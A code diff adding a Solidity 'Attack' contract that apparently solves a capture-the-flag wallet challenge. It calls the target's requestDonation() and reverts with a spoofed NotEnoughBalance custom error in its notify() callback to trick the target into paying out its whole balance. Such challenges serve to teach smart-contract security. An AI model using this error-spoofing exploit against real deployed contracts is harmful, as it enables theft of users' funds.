@@ -101,3 +101,23 @@ contract Wallet {
 interface INotifyable {
     function notify(uint256 amount) external;
 }
+
+contract Attack is INotifyable {
+    GoodSamaritan target;
+
+    error NotEnoughBalance();
+
+    constructor(GoodSamaritan _target) {
+        target = _target;
+    }
+
+    function attack() public {
+        target.requestDonation();
+    }
+
+    function notify(uint256 amount) external {
+        if (amount < 1000000) {
+            revert NotEnoughBalance();
+        }
+    }
+}
